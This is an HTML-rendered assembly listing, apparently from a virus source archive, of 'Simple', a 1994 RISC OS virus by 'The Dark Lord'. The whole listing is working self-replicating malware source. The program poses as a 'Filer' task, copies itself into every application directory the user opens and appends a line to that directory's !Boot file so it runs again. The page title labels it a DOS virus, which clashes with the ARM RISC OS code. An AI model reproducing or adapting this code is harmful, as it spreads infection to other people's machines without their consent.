<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.SimFF - simff.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Simple, a example virus</span><span class="sc0">
</span><span class="sc1">; Copyright (C) 1994 The Dark Lord</span><span class="sc0">

</span><span class="sc5">.start</span><span class="sc0">
</span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">wimp_init</span><span class="sc0">         </span><span class="sc1">;Jump over copyright message</span><span class="sc0">

</span><span class="sc5">DCB</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc3">"Simple, (C) 1994 The Dark Lord"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">ALIGN</span><span class="sc0">

</span><span class="sc5">.wimp_init</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">200</span><span class="sc0">         </span><span class="sc1">;Minimum WIMP is 2.00</span><span class="sc0">
</span><span class="sc5">LDR</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">task</span><span class="sc0">         </span><span class="sc1">;Load magic word</span><span class="sc0">
</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R2</span><span class="sc4">,</span><span class="sc5">taskname</span><span class="sc0">     </span><span class="sc1">;Pointer to our task's name</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XWimp_Initialise</span><span class="sc0">    </span><span class="sc1">;Init the wimp</span><span class="sc0">
</span><span class="sc5">SWIVS</span><span class="sc0">   </span><span class="sc5">XOS_Exit</span><span class="sc0">        </span><span class="sc1">;Just incase of error</span><span class="sc0">
</span><span class="sc6">STR</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">taskhandle</span><span class="sc0">       </span><span class="sc1">;store the task handle</span><span class="sc0">

</span><span class="sc5">.poll_loop</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Poll mask</span><span class="sc0">
</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">pollblock</span><span class="sc0">        </span><span class="sc1">;Poll block</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XWimp_Poll</span><span class="sc0">      </span><span class="sc1">;Poll the wimp...</span><span class="sc0">
</span><span class="sc5">TEQ</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">17</span><span class="sc0">          </span><span class="sc1">;Is the poll message wanted?</span><span class="sc0">
</span><span class="sc5">TEQNE</span><span class="sc0">   </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">18</span><span class="sc0">          </span><span class="sc1">;Is it the other message wanted?</span><span class="sc0">
</span><span class="sc5">BNE</span><span class="sc0"> </span><span class="sc5">poll_loop</span><span class="sc0">       </span><span class="sc1">;It is not relevent, branch back to top</span><span class="sc0">
</span><span class="sc5">TEQ</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">17</span><span class="sc0">          </span><span class="sc1">;User_Message</span><span class="sc0">
</span><span class="sc5">TEQNE</span><span class="sc0">   </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">18</span><span class="sc0">          </span><span class="sc1">;User_MessageRecorded</span><span class="sc0">
</span><span class="sc5">BEQ</span><span class="sc0"> </span><span class="sc5">user_message</span><span class="sc0">
</span><span class="sc5">B</span><span class="sc0">   </span><span class="sc5">poll_loop</span><span class="sc0">       </span><span class="sc1">;Back to the top just incase</span><span class="sc0">

</span><span class="sc5">.user_message</span><span class="sc0">
</span><span class="sc5">LDR</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,[</span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Get message number from block</span><span class="sc0">
</span><span class="sc5">TEQ</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">;Message_DataOpen (5)</span><span class="sc0">
</span><span class="sc5">TEQNE</span><span class="sc0">   </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Message_Quit (0)</span><span class="sc0">
</span><span class="sc5">BNE</span><span class="sc0"> </span><span class="sc5">poll_loop</span><span class="sc0">       </span><span class="sc1">;Not an interesting message, return to poll</span><span class="sc0">

</span><span class="sc5">TEQ</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">;Message_DataOpen (5)</span><span class="sc0">
</span><span class="sc5">BEQ</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">          </span><span class="sc1">;If so, try and infect</span><span class="sc0">
</span><span class="sc5">TEQ</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Message_Quit</span><span class="sc0">
</span><span class="sc5">BEQ</span><span class="sc0"> </span><span class="sc5">closedown</span><span class="sc0">       </span><span class="sc1">;If so, close down wimp and quit</span><span class="sc0">
</span><span class="sc5">B</span><span class="sc0">   </span><span class="sc5">poll_loop</span><span class="sc0">       </span><span class="sc1">;Just incase</span><span class="sc0">

</span><span class="sc5">.closedown</span><span class="sc0">
</span><span class="sc5">LDR</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc5">taskhandle</span><span class="sc0">       </span><span class="sc1">;Load our task's handle</span><span class="sc0">
</span><span class="sc5">LDR</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">task</span><span class="sc0">         </span><span class="sc1">;Load the magic word</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XWimp_CloseDown</span><span class="sc0">     </span><span class="sc1">;Close down wimp task</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XOS_Exit</span><span class="sc0">        </span><span class="sc1">;And quit program</span><span class="sc0">

</span><span class="sc5">.infect</span><span class="sc0">
</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc5">pollblock</span><span class="sc0">        </span><span class="sc1">;Get the address of poll block</span><span class="sc0">
</span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">44</span><span class="sc0">       </span><span class="sc1">;Go to the path of file</span><span class="sc0">
</span><span class="sc8">BL</span><span class="sc0">  </span><span class="sc5">count_len</span><span class="sc0">       </span><span class="sc1">;Count the string's length, into R11</span><span class="sc0">
</span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc5">R11</span><span class="sc0">       </span><span class="sc1">;Add to pointer to get to end of pathname</span><span class="sc0">
</span><span class="sc6">STR</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">place</span><span class="sc0">        </span><span class="sc1">;Save place for later reference</span><span class="sc0">

</span><span class="sc5">MVN</span><span class="sc0"> </span><span class="sc5">R3</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Virus filename counter</span><span class="sc0">
</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R4</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">;Address of string to copy</span><span class="sc0">
</span><span class="sc5">.copy_filename1</span><span class="sc0">
</span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">R3</span><span class="sc4">,</span><span class="sc5">R3</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;Add 1 to counter</span><span class="sc0">
</span><span class="sc5">LDRB</span><span class="sc0">    </span><span class="sc5">R5</span><span class="sc4">,[</span><span class="sc5">R4</span><span class="sc4">,</span><span class="sc5">R3</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Load a byte from original string</span><span class="sc0">
</span><span class="sc5">STRB</span><span class="sc0">    </span><span class="sc5">R5</span><span class="sc4">,[</span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">R3</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;And write it on the end of the path</span><span class="sc0">
</span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">R5</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Is it a null?</span><span class="sc0">
</span><span class="sc5">BNE</span><span class="sc0"> </span><span class="sc5">copy_filename1</span><span class="sc0">      </span><span class="sc1">;No, copy next character</span><span class="sc0">

</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc5">pollblock</span><span class="sc0">        </span><span class="sc1">;save_code expects filename in R10</span><span class="sc0">
</span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">R10</span><span class="sc4">,</span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">44</span><span class="sc0">      </span><span class="sc1">;so reextract it from pollblock</span><span class="sc0">
</span><span class="sc8">BL</span><span class="sc0">  </span><span class="sc5">save_code</span><span class="sc0">       </span><span class="sc1">;Save the code in the file pointed to</span><span class="sc0">

</span><span class="sc5">MVN</span><span class="sc0"> </span><span class="sc5">R3</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Boot filename counter</span><span class="sc0">
</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R4</span><span class="sc4">,</span><span class="sc5">boot</span><span class="sc0">         </span><span class="sc1">;Address of string to copy</span><span class="sc0">
</span><span class="sc5">LDR</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc5">place</span><span class="sc0">        </span><span class="sc1">;Get the place again</span><span class="sc0">
</span><span class="sc5">.copy_filename2</span><span class="sc0">
</span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">R3</span><span class="sc4">,</span><span class="sc5">R3</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;Add one to counter</span><span class="sc0">
</span><span class="sc5">LDRB</span><span class="sc0">    </span><span class="sc5">R5</span><span class="sc4">,[</span><span class="sc5">R4</span><span class="sc4">,</span><span class="sc5">R3</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Get next byte of original string</span><span class="sc0">
</span><span class="sc5">STRB</span><span class="sc0">    </span><span class="sc5">R5</span><span class="sc4">,[</span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc5">R3</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;And save the byte back</span><span class="sc0">
</span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">R5</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Is it the null at the end?</span><span class="sc0">
</span><span class="sc5">BNE</span><span class="sc0"> </span><span class="sc5">copy_filename2</span><span class="sc0">      </span><span class="sc1">;No, copy next chacater</span><span class="sc0">

</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc5">pollblock</span><span class="sc0">        </span><span class="sc1">;boot_line expects filename in R10</span><span class="sc0">
</span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">R10</span><span class="sc4">,</span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">44</span><span class="sc0">      </span><span class="sc1">;so reextract it from pollblock</span><span class="sc0">
</span><span class="sc8">BL</span><span class="sc0">  </span><span class="sc5">add_boot_line</span><span class="sc0">       </span><span class="sc1">;save the boot line to !Boot file</span><span class="sc0">

</span><span class="sc5">B</span><span class="sc0">   </span><span class="sc5">poll_loop</span><span class="sc0">       </span><span class="sc1">;Branch back to poll loop.</span><span class="sc0">

</span><span class="sc5">.count_len</span><span class="sc0">
</span><span class="sc5">MVN</span><span class="sc0"> </span><span class="sc5">R11</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;counter/offset pointer</span><span class="sc0">
</span><span class="sc5">.count_loop</span><span class="sc0">
</span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">R11</span><span class="sc4">,</span><span class="sc5">R11</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">;Add one to our counter/offset pointer</span><span class="sc0">
</span><span class="sc5">LDRB</span><span class="sc0">    </span><span class="sc5">R10</span><span class="sc4">,[</span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc5">R11</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Load a byte from R0+R11</span><span class="sc0">
</span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">R10</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;Compare byte will null terminator</span><span class="sc0">
</span><span class="sc5">BNE</span><span class="sc0"> </span><span class="sc5">count_loop</span><span class="sc0">      </span><span class="sc1">;Not a null, get next character and count</span><span class="sc0">

</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PC</span><span class="sc4">,</span><span class="sc5">R14</span><span class="sc0">          </span><span class="sc1">;Return to calling code. R11=Length</span><span class="sc0">

</span><span class="sc5">.save_code</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">10</span><span class="sc0">          </span><span class="sc1">;Save memory as file</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">R10</span><span class="sc0">          </span><span class="sc1">;Move filename from R10 to R1</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R2</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc4">&amp;</span><span class="sc5">FF0</span><span class="sc0">        </span><span class="sc1">;Absolute executable file type</span><span class="sc0">
</span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">R2</span><span class="sc4">,</span><span class="sc5">R2</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">;&amp;FF8 won't fit in the instrucion, so add 8</span><span class="sc0">
</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R4</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc0">        </span><span class="sc1">;Start of code</span><span class="sc0">
</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R5</span><span class="sc4">,</span><span class="sc9">end</span><span class="sc0">          </span><span class="sc1">;End of code</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XOS_File</span><span class="sc0">        </span><span class="sc1">;Save the code</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PC</span><span class="sc4">,</span><span class="sc5">R14</span><span class="sc0">          </span><span class="sc1">;Return to calling code.</span><span class="sc0">

</span><span class="sc5">.add_boot_line</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc4">&amp;</span><span class="sc5">C0</span><span class="sc0">         </span><span class="sc1">;Open file</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">R10</span><span class="sc0">          </span><span class="sc1">;Move filename from R10 to R1</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XOS_Find</span><span class="sc0">        </span><span class="sc1">;Open the file, handle in R0</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R9</span><span class="sc4">,</span><span class="sc5">R0</span><span class="sc0">           </span><span class="sc1">;Move handle somewhere safe</span><span class="sc0">

</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;Read Extent</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">R9</span><span class="sc0">           </span><span class="sc1">;File handle</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XOS_Args</span><span class="sc0">        </span><span class="sc1">;Get the extend of the file into R2</span><span class="sc0">

</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;Set pointer</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XOS_Args</span><span class="sc0">        </span><span class="sc1">;R2 is already set from above</span><span class="sc0">

</span><span class="sc5">MVN</span><span class="sc0"> </span><span class="sc5">R2</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Counter of bytes written</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R1</span><span class="sc4">,</span><span class="sc5">R9</span><span class="sc0">           </span><span class="sc1">;Get the file handle from R9</span><span class="sc0">
</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc5">R3</span><span class="sc4">,</span><span class="sc5">load_line</span><span class="sc0">        </span><span class="sc1">;Address of line to add</span><span class="sc0">
</span><span class="sc5">.put_loop</span><span class="sc0">
</span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">R2</span><span class="sc4">,</span><span class="sc5">R2</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;Add 1 to the counter</span><span class="sc0">
</span><span class="sc5">LDRB</span><span class="sc0">    </span><span class="sc5">R0</span><span class="sc4">,[</span><span class="sc5">R3</span><span class="sc4">,</span><span class="sc5">R2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Load the next byte</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XOS_BPut</span><span class="sc0">        </span><span class="sc1">;And write the byte to the file</span><span class="sc0">
</span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">R2</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">18</span><span class="sc0">          </span><span class="sc1">;Is it the last character yet?</span><span class="sc0">
</span><span class="sc5">BNE</span><span class="sc0"> </span><span class="sc5">put_loop</span><span class="sc0">        </span><span class="sc1">;If not, loop again</span><span class="sc0">

</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R0</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Close File</span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">R9</span><span class="sc4">,</span><span class="sc5">R1</span><span class="sc0">           </span><span class="sc1">;Move file handle from R9 to R1</span><span class="sc0">
</span><span class="sc5">SWI</span><span class="sc0"> </span><span class="sc5">XOS_Find</span><span class="sc0">        </span><span class="sc1">;Close the file</span><span class="sc0">

</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PC</span><span class="sc4">,</span><span class="sc5">R14</span><span class="sc0">          </span><span class="sc1">;Otherwise, return to calling code.</span><span class="sc0">

</span><span class="sc5">.task</span><span class="sc0">
</span><span class="sc5">DCB</span><span class="sc0"> </span><span class="sc3">"TASK"</span><span class="sc0">
</span><span class="sc5">.taskname</span><span class="sc0">
</span><span class="sc5">DCB</span><span class="sc0"> </span><span class="sc3">"Filer"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">.load_line</span><span class="sc0">
</span><span class="sc5">DCB</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc4">,</span><span class="sc3">"Obey$Dir"</span><span class="sc4">,</span><span class="sc2">62</span><span class="sc4">,</span><span class="sc3">".Simple"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">.filename</span><span class="sc0">
</span><span class="sc5">DCB</span><span class="sc0"> </span><span class="sc3">".Simple"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">.boot</span><span class="sc0">
</span><span class="sc5">DCB</span><span class="sc0"> </span><span class="sc3">".!Boot"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ALIGN</span><span class="sc0">
</span><span class="sc5">.taskhandle</span><span class="sc0">
</span><span class="sc5">DCD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">.place</span><span class="sc0">
</span><span class="sc5">DCD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">.end</span><span class="sc0">
</span><span class="sc5">.pollblock</span><span class="sc0">
</span></div></body>
</html>
